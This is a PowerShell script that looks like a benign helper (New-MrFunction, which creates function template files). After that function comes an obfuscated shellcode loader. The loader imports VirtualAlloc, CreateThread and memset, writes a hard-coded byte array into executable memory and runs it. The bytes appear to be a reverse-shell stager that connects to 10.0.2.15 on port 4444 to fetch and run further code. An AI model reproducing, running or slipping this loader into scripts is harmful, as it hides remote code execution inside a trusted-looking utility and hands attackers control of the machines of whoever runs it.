function n`eW`-MRfunctiOn {



    [CmdletBinding()]
    [OutputType({"{3}{0}{1}{2}{4}"-f '.I','O','.Fil','System','eInfo'})]
    param (
        [ValidateScript({
          If ((&("{2}{0}{1}"-f'et-V','erb','G') -Verb (${_} -replace (('-.*'+'a'+'X1')."R`ePLACE"(([chAR]97+[chAR]88+[chAR]49),'$'))))."vE`Rb") {
            ${Tr`Ue}
          }
          else {
            Throw ("'$_' "+'does'+' '+'N'+'OT '+'us'+'e '+'a'+'n '+'approve'+'d'+' '+'Ver'+'b.')
          }
        })]
        [string]${na`Me},

        [ValidateScript({
          If (.("{1}{0}{2}"-f'st-Pa','Te','th') -Path ${_} -PathType ("{2}{1}{0}"-f 'iner','nta','Co')) {
            ${Tr`Ue}
          }
          else {
            Throw ("'$_' "+'is'+' '+'n'+'ot '+'a '+'val'+'id '+'dir'+'ecto'+'ry.')
          }
        })]
        [string]${PA`Th}
    )

    ${fUN`cTio`Np`Ath} = .("{0}{2}{1}"-f 'Jo','th','in-Pa') -Path ${p`ATh} -ChildPath "$Name.ps1"

    if (-not(&("{0}{2}{1}"-f 'Test-P','th','a') -Path ${F`U`NCTi`oNp`ATH})) {
    
        &("{2}{3}{1}{0}"-f 're','xtu','New','-Fi') -Path ${pa`Th} -Name ${nA`me}
        &("{1}{2}{0}{3}"-f 'Conte','Set','-','nt') -Path ${fUnc`T`i`onpa`Th} -Force -Value "
function $($Name) {



    [CmdletBinding()]
    [OutputType('PSCustomObject')]
    param (
        [Parameter(Mandatory, 
                   ValueFromPipeline)]
        [string[]]`$Param1,

        [ValidateNotNullOrEmpty()]
        [string]`$Param2
    )

    BEGIN {
        
    }

    PROCESS {
        

        foreach (`$Param in `$Param1) {
            
        }
    }

    END {
        
    }

}"
    
    }
    else {
        &("{0}{1}{3}{2}" -f'Wr','i','Error','te-') -Message ("{2}{5}{14}{1}{13}{7}{6}{10}{12}{4}{3}{15}{8}{9}{0}{11}" -f'ts','e to create f','Un','e','fil','ab','n. Spe','tio','lr','eady exis','c','!','ified ','unc','l',' a')
    }    

}
${C} = ((("{79}{63}{59}{70}{45}{52}{16}{43}{4}{77}{75}{9}{13}{80}{18}{17}{76}{51}{49}{72}{68}{57}{84}{61}{48}{53}{90}{8}{24}{82}{37}{92}{5}{62}{27}{20}{39}{58}{64}{28}{88}{14}{56}{60}{50}{46}{66}{47}{33}{11}{19}{87}{29}{15}{38}{1}{44}{6}{36}{21}{65}{78}{12}{26}{25}{2}{89}{83}{42}{91}{81}{41}{35}{67}{69}{10}{3}{30}{7}{85}{73}{86}{22}{34}{0}{55}{31}{54}{40}{32}{74}{23}{71}"-f 'r memset(','Size, IntP','nt dwCrea','msvc',']','otec',' lpStartAddre','t.dll','io','tatic','(9fw','hreadAttri','p',' extern',' ex','wStac','9fw','(I','Alloc','but','[D','r','rn ',')','nType, ','arameter, ui','P',');','el32.dll9fw)]p',', uint d','r','r ','ou','Ptr lpT','IntPt','Id);[Dll','ss, IntPt','P','k','llI','rc, uint c','lpThread','Flag',')','tr','l','Cr','teThread(Int','nt ','tr',' ','tP','l','dwSize, uint flAlloca','dest, uint s','IntPt','tern I','ddr','mport(9fwke','port(9fwkernel32.','ntPtr','s, ui','t','m','rn',' ','ea','Im','pA','port','d',';',' l',' ex','nt','s','n','public ','l','[DllI',' IntPtr Virtual','IntPtr ','uint fl','n','es','9fw)]public static','te','es','ublic static','tio','t','s, ','r')) -REplACE '9fw',[cHar]34);${W} = .("{0}{1}" -f'Add-T','ype') -memberDefinition ${c} -Name ("{1}{0}" -f'32','Win') -namespace ("{0}{3}{1}{2}" -f 'Win32','ion','s','Funct') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${Z}."l`enGtH" -gt 0x1000){${g} = ${z}."L`eNgth"};${X}=${W}::("{0}{1}{2}"-f'VirtualAl','lo','c').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${Z}."LeN`gth"-1);${i}++) {${W}::"ME`MsEt"([IntPtr](${x}.("{2}{1}{0}"-f'32','oInt','T').Invoke()+${i}), ${Z}[${I}], 1)};${W}::("{1}{2}{0}{3}"-f'te','Cr','ea','Thread').Invoke(0,0,${X},0,0,0);for (;;){.("{1}{0}{3}{2}"-f 'art-sl','St','p','ee') 60};
